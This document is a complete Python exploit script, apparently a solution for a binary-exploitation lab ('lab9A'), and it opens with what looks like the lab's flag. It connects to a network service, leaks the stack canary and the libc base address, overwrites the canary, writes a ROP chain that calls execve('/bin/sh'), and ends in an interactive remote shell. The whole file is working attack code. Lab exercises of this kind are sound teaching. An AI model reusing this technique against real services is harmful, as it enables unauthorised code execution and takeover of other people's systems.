#!/usr/bin/env python3
#
# lab9A: 1_th0uGht_th4t_w4rn1ng_wa5_l4m3
#

import sys
import struct
import socket

def main():

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(("192.168.159.129", 9943))
  sock.settimeout(1)

  if (len(recvall(sock)) > 1):
    print("[*] Banner recieved, continuing exploitation")
  else:
    print("[-] Banner grab failed exiting...")
    exit(-1)

  cookie = leak_canary(sock)
  print("[*] Successfully leaked stack cookie: 0x%x" % cookie)

  libc_base = leak_libc(sock)
  print("[*] Successfully leaked libc base pointer: 0x%x" % libc_base)

  exploit(sock, cookie, libc_base)

  while True:
    try:
      sock.send(input("wetw0rk> ").encode('latin-1') + b"\n")
      print(recvall(sock).decode('latin-1'))
    except:
      print("[-] Exiting shell...")
      exit(0)

# exploit: 
def exploit(sockfd, cookie, libc_base):

  print("[*] Overwriting stack canary")
  for i in range(256):

    sockfd.send(b"1\n")
    recvall(sockfd)

    sockfd.send(b"1094795585\n")
    recvall(sockfd)

  sockfd.send(b"1\n")
  recvall(sockfd)
 
  cookie = ("%d\n" % cookie).encode('latin1')
  sockfd.send(cookie)
  recvall(sockfd)

  print("[*] Writing exploit buffer")
  generate_rop_chain(sockfd, libc_base)

  print("[+] Exploitation complete, triggering\n")
  sockfd.send(b"3\n")

  return

# generate_rop_chain: generates rop chain using write vuln
def generate_rop_chain(sockfd, base):

  rop_gadgets = [
    # ROP NOP into the ropchain(s)
    base+0x417,    # ret [libc-2.19.so]
    base+0x417,    # ret [libc-2.19.so]
    base+0x417,    # ret [libc-2.19.so]
    base+0x417,    # ret [libc-2.19.so]
    # execve("/bin/sh", 0, 0)
    base+0x2469f,  # pop eax; ret [libc-2.19.so]
    0x0000000b,    # execve syscall number
    base+0x198ce,  # pop ebx; ret [libc-2.19.so]
    base+0x160a24, # *ptr -> "/bin/sh"
    base+0x2e3cb,  # pop ecx; pop edx; ret; [libc-2.19.so]
    0x00000000,    # zero out
    0x00000000,    # zero out
    base+0x2e6a5,  # int 0x80 [libc-2.19.so]
  ]

  for i in range(len(rop_gadgets)):
    write_gadget(sockfd, rop_gadgets[i])

  return

# write_gadget: writes a gadget (less code)
def write_gadget(sockfd, gadget):

  sockfd.send(b"1\n")
  recvall(sockfd)

  gadget = ("%d\n" % gadget).encode('latin1')
  sockfd.send(gadget)
  recvall(sockfd)

  return

# leak_libc: leak a pointer to libc, must add 0x100000000 to properly parse leak
def leak_libc(sockfd):

  sockfd.send(b"2\n")
  recvall(sockfd)

  sockfd.send(b"4\n")
  data = recvall(sockfd)

  libc = int(data.split(b' ')[2].split(b'\n')[0]) + 0x100000000

  return libc-0x2034

# leak_canary: leak the stack cookie, nothing special needed to extract cookie
def leak_canary(sockfd):

  sockfd.send(b"2\n")
  recvall(sockfd)

  sockfd.send(b"257\n")
  data = recvall(sockfd)

  canary = int(data.split(b' ')[2].split(b'\n')[0])

  if canary < 0:
    print("[-] Failed to capture canary run again")
    exit(-1)

  return canary

# recvall: updated recvall, alot faster. code borrowed from BHP ;)
def recvall(sockfd):

  recv_len = 1
  response = b""

  while recv_len:

    # Timeout to handle EOF from sockfd
    try:
      rdata = sockfd.recv(4096)
      recv_len = len(rdata)
      response += rdata

      if recv_len < 4096:
        break
    except:
      break

  return response

main()
